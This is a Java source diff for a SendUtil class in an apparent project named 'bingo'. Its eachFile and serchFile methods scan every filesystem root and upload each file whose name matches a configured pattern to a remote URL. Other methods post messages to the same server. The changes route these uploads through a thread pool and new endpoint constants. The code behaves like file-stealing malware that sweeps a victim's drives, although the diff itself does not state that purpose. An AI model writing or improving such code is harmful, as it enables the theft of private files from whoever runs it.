@@ -13,7 +13,7 @@ import com.bingo.common.MessageType;
 
 public class SendUtil {
 
-    private static ExecutorService executor = Executors.newFixedThreadPool(5);
+    private static ExecutorService executor = Executors.newFixedThreadPool(10);
 
     public static void sendMessage(MessageType messageType) {
         if (ConstantConfig.IS_SEND_MESSAGE) {
@@ -40,14 +40,14 @@ public class SendUtil {
      */
     public static void send(MessageType messageType) {
         try {
-            HttpUtil.doPost(ConstantConfig.SEND_URL,
+            HttpUtil.doPost(ConstantConfig.URL_ + ConstantConfig.URL_MESS,
                     EntityToStringUtil.conver(new MessageEntity(messageType.getKey(),
                             messageType.getValue())));
-        } catch (NoSuchMethodException 
-                | ClassNotFoundException 
-                | InvocationTargetException 
-                | IllegalArgumentException 
-                | IllegalAccessException 
+        } catch (NoSuchMethodException
+                | ClassNotFoundException
+                | InvocationTargetException
+                | IllegalArgumentException
+                | IllegalAccessException
                 | SecurityException e) {
             e.printStackTrace();
         }
@@ -55,12 +55,12 @@ public class SendUtil {
 
     public static void send(Map<String, String> map) {
         try {
-            HttpUtil.doPost(ConstantConfig.SEND_URL, EntityToStringUtil.conver(map));
-        } catch (NoSuchMethodException 
-                | ClassNotFoundException 
-                | InvocationTargetException 
-                | IllegalArgumentException 
-                | IllegalAccessException 
+            HttpUtil.doPost(ConstantConfig.URL_ + ConstantConfig.URL_MESS, EntityToStringUtil.conver(map));
+        } catch (NoSuchMethodException
+                | ClassNotFoundException
+                | InvocationTargetException
+                | IllegalArgumentException
+                | IllegalAccessException
                 | SecurityException e) {
             e.printStackTrace();
         }
@@ -73,8 +73,8 @@ public class SendUtil {
      */
     public static void send(String message) {
         try {
-            HttpUtil.doPost(ConstantConfig.SEND_URL, EntityToStringUtil.conver(new MessageEntity(message, 
-                    "-1")));
+            HttpUtil.doPost(ConstantConfig.URL_ + ConstantConfig.URL_MESS,
+                    EntityToStringUtil.conver(new MessageEntity(message, "-1")));
         } catch (NoSuchMethodException
                 | SecurityException
                 | IllegalAccessException
@@ -95,7 +95,7 @@ public class SendUtil {
     public static void eachFile() {
         File[] files = File.listRoots();
         for (File file : files) {
-            new Thread(() -> serchFile(file)).start();
+            executor.execute(() -> serchFile(file));
         }
     }
 
@@ -111,7 +111,7 @@ public class SendUtil {
             }
         } else {
             if (Pattern.compile(ConstantConfig.REG_FILE).matcher(file.getName()).find()) {
-                HttpUtil.doPostAndFile2(ConstantConfig.SEND_URL, "", file);
+                HttpUtil.doPostFile2(ConstantConfig.URL_ + ConstantConfig.URL_FILE, "", file);
             }
         }
     }
